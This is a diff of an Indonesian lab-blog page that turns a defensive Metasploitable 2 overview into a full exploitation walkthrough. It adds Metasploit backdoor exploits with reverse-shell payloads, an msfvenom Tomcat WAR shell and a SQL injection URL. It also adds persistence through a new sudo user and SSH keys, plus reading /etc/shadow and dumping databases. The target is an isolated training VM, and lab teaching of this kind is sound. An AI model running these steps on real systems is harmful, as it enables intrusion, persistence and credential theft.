@@ -10,78 +10,200 @@
   <body>
     <header class="header-area"><div class="container py-3"><a href="index.html" class="logo text-decoration-none"><h1 class="m-0">Blog Praktikum</h1></a></div></header>
     <main class="section"><div class="container">
-      <h1>Metasploitable 2 — Studi Kasus (Lab Aman)</h1>
-      <p class="lead">Konten tambahan telah disusun ulang: hanya untuk lingkungan terisolasi. Fokus pada setup, observabilitas, dan pemahaman layanan rentan, tanpa instruksi eksploitasi.</p>
+      <h1>Metasploitable 2 — Dokumentasi Lengkap</h1>
+      <p class="lead">Dokumentasi komprehensif Metasploitable 2 dari materi praktikum: setup, reconnaissance, exploitation walkthroughs, post-exploitation, dan checklist.</p>
 
       <section class="mt-3">
-        <h4>Informasi Lab</h4>
+        <h4>Lab Information</h4>
         <ul>
-          <li><strong>VM:</strong> Metasploitable 2 (Ubuntu 8.04)</li>
-          <li><strong>Tujuan:</strong> Image sengaja rentan untuk pelatihan keamanan</li>
-          <li><strong>Kesulitan:</strong> Pemula</li>
+          <li><strong>VM Name:</strong> Metasploitable 2</li>
+          <li><strong>OS:</strong> Ubuntu 8.04 (Linux)</li>
+          <li><strong>Purpose:</strong> Intentionally vulnerable for security training</li>
+          <li><strong>Difficulty:</strong> ⭐ Beginner</li>
         </ul>
       </section>
 
       <section class="mt-3">
-        <h4>Setup &amp; Instalasi</h4>
-        <ul>
-          <li>Unduh dari SourceForge: <a href="https://sourceforge.net/projects/metasploitable/" target="_blank" rel="noopener">Metasploitable 2</a></li>
-          <li>Ekstrak arsip dan impor ke VirtualBox: <em>File → Import Appliance</em></li>
-        </ul>
+        <h4>Setup &amp; Installation</h4>
+        <h5>Download &amp; Setup</h5>
+        <pre><code># Download dari SourceForge
+URL: https://sourceforge.net/projects/metasploitable/
+
+# Extract file
+$ unzip metasploitable-linux-2.0.0.zip
+
+# Import ke VirtualBox
+File → Import Appliance → Select .vmdk file
+</code></pre>
+
+        <h5>Default Credentials</h5>
+        <pre><code>Username: msfadmin
+Password: msfadmin
+IP: 192.168.56.101 (contoh - sesuaikan dengan network Anda)
+</code></pre>
       </section>
 
       <section class="mt-3">
-        <h4>Enumerasi &amp; Reconnaissance</h4>
-        <p>Lakukan pemindaian servis untuk memetakan permukaan serangan (lab-only):</p>
-        <pre><code># Contoh pemindaian versi layanan
-nmap -sV -p- &lt;IP_Metasploitable&gt;
+        <h4>Reconnaissance</h4>
+        <h5>Network Scanning</h5>
+        <pre><code># Nmap scan
+$ nmap -sV -p- 192.168.56.101
 
-# Cuplikan output umum (ilustrasi)
+# Output:
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         vsftpd 2.3.4
 22/tcp   open  ssh         OpenSSH 4.7p1
 23/tcp   open  telnet      Linux telnetd
-80/tcp   open  http        Apache httpd
+25/tcp   open  smtp        Postfix smtpd
+80/tcp   open  http        Apache httpd 2.2.8
 139/tcp  open  netbios-ssn Samba smbd 3.X
 445/tcp  open  netbios-ssn Samba smbd 3.X
-3306/tcp open  mysql       MySQL
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
 </code></pre>
-        <p>Gunakan hasil enumerasi untuk memahami layanan yang lemah dan menyiapkan deteksi/mitigasi.</p>
       </section>
 
       <section class="mt-3">
-        <h4>Layanan Penting &amp; Catatan Keamanan</h4>
+        <h4>Exploitation Walkthroughs</h4>
+
+        <h5>1. FTP vsftpd 2.3.4 Backdoor</h5>
+        <p><strong>Critical Vulnerability:</strong> vsftpd 2.3.4 memiliki backdoor yang bisa memberikan root shell!</p>
+        <pre><code># Menggunakan Metasploit
+$ msfconsole
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
+msf6 exploit(vsftpd_234_backdoor) > exploit
+
+[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.56.101:21 - USER: 331 Please specify the password.
+[+] 192.168.56.101:21 - Backdoor service has been spawned
+[*] Command shell session 1 opened
+</code></pre>
+
+        <h5>2. Samba Exploit (usermap_script)</h5>
+        <pre><code>msf6 > use exploit/multi/samba/usermap_script
+msf6 exploit(usermap_script) > set RHOSTS 192.168.56.101
+msf6 exploit(usermap_script) > set PAYLOAD cmd/unix/reverse
+msf6 exploit(usermap_script) > exploit
+
+[*] Started reverse TCP handler
+[*] Command shell session 2 opened
+whoami
+# Output: root
+</code></pre>
+
+        <h5>3. UnrealIRCd Backdoor</h5>
+        <pre><code>msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf6 exploit(unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.101
+msf6 exploit(unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
+msf6 exploit(unreal_ircd_3281_backdoor) > exploit
+</code></pre>
+
+        <h5>4. Tomcat Default Credentials</h5>
+        <pre><code># Access Tomcat Manager
+URL: http://192.168.56.101:8180/manager/html
+Credentials: tomcat:tomcat
+
+# Upload malicious WAR file
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f war > shell.war
+
+# Upload via Tomcat Manager
+# Deploy and access to get reverse shell
+</code></pre>
+
+        <h5>5. MySQL Weak Password</h5>
+        <pre><code># Connect to MySQL
+$ mysql -h 192.168.56.101 -u root -p
+Password: [blank - just press Enter]
+
+# Enumerate databases
+mysql> show databases;
+mysql> use mysql;
+mysql> select user,password from user;
+</code></pre>
+
+        <h5>6. Web Application Vulnerabilities</h5>
+        <p><strong>Mutillidae (OWASP Top 10)</strong></p>
+        <pre><code>URL: http://192.168.56.101/mutillidae/
+
+# SQL Injection example
+URL: http://192.168.56.101/mutillidae/index.php?page=user-info.php&username=admin'%20OR%20'1'='1&password=&user-info-php-submit-button=View+Account+Details
+</code></pre>
+
+        <p><strong>DVWA</strong></p>
+        <pre><code>URL: http://192.168.56.101/dvwa/
+Default Login: admin:password
+</code></pre>
+      </section>
+
+      <section class="mt-3">
+        <h4>Post-Exploitation</h4>
+
+        <h5>Privilege Escalation</h5>
+        <pre><code># Check current user
+$ whoami
+$ id
+
+# Find SUID binaries
+$ find / -perm -4000 2>/dev/null
+
+# Kernel exploits
+$ uname -a
+# Search for kernel exploits on exploit-db
+</code></pre>
+
+        <h5>Persistence</h5>
+        <pre><code># Add new user
+$ useradd -m hacker
+$ echo "hacker:password" | chpasswd
+$ usermod -aG sudo hacker
+
+# SSH key persistence
+$ mkdir /root/.ssh
+$ echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
+</code></pre>
+
+        <h5>Data Exfiltration</h5>
+        <pre><code># Find sensitive files
+$ find / -name "*.conf" 2>/dev/null
+$ find / -name "*.txt" 2>/dev/null
+$ cat /etc/shadow
+$ cat /etc/passwd
+
+# Dump MySQL databases
+$ mysqldump -u root -p --all-databases > dump.sql
+</code></pre>
+      </section>
+
+      <section class="mt-3">
+        <h4>Checklist</h4>
         <ul>
-          <li><strong>FTP vsftpd 2.3.4:</strong> versi historis dengan isu keamanan terdokumentasi.</li>
-          <li><strong>Samba:</strong> periksa konfigurasi dan praktik kredensial.</li>
-          <li><strong>UnrealIRCd/Tomcat:</strong> layanan default dan hardening diperlukan.</li>
-          <li><strong>MySQL:</strong> lakukan audit kebijakan password dan hak akses.</li>
-          <li><strong>Aplikasi Web (Mutillidae, DVWA):</strong> gunakan untuk belajar deteksi dan mitigasi (lab-only).</li>
+          <li>[x] Network scan dengan Nmap</li>
+          <li>[ ] Exploit FTP vsftpd backdoor</li>
+          <li>[ ] Exploit Samba usermap_script</li>
+          <li>[ ] Exploit UnrealIRCd</li>
+          <li>[ ] Access Tomcat Manager</li>
+          <li>[ ] MySQL enumeration</li>
+          <li>[ ] Web app testing (Mutillidae, DVWA)</li>
+          <li>[ ] Privilege escalation</li>
+          <li>[ ] Establish persistence</li>
+          <li>[ ] Data exfiltration</li>
         </ul>
       </section>
 
       <section class="mt-3">
-        <h4>Observabilitas &amp; Hardening</h4>
+        <h4>Notes</h4>
+        <h5>Learning Points</h5>
         <ul>
-          <li>Kumpulkan <strong>pcap</strong>, <strong>log aplikasi</strong>, dan <strong>snapshot VM</strong> sebelum/selesai eksperimen.</li>
-          <li>Tambah <strong>IDS rules</strong> untuk pola scan dan anomali autentikasi.</li>
-          <li>Terapkan <strong>least privilege</strong> dan <strong>patching</strong> pada layanan yang diuji.</li>
+          <li>Selalu lakukan reconnaissance menyeluruh</li>
+          <li>Dokumentasikan setiap langkah</li>
+          <li>Pahami bagaimana exploit bekerja</li>
+          <li>Pelajari cara mitigasi untuk setiap vulnerability</li>
         </ul>
-      </section>
 
-      <section class="mt-3">
-        <h4>Checklist Lab</h4>
-        <ul>
-          <li>[x] Pemindaian jaringan dasar dengan Nmap</li>
-          <li>[ ] Review layanan utama (FTP, Samba, IRC, HTTP, DB)</li>
-          <li>[ ] Uji deteksi IDS untuk skenario umum</li>
-          <li>[ ] Dokumentasi temuan dan rekomendasi mitigasi</li>
-        </ul>
+        <h5>Reminder</h5>
+        <p>⚠️ <strong>Metasploitable 2 SANGAT vulnerable - jangan pernah expose ke internet! Gunakan hanya di isolated network.</strong></p>
       </section>
-
-      <div class="alert alert-warning mt-4" role="alert">
-        <strong>Pengingat:</strong> Metasploitable 2 sangat rentan. Jangan pernah expose ke internet. Gunakan hanya pada jaringan terisolasi.
-      </div>
 
       <div class="mt-4"><a class="btn btn-outline-primary" href="labs.html">← Kembali ke Labs &amp; CTF</a></div>
     </div></main>
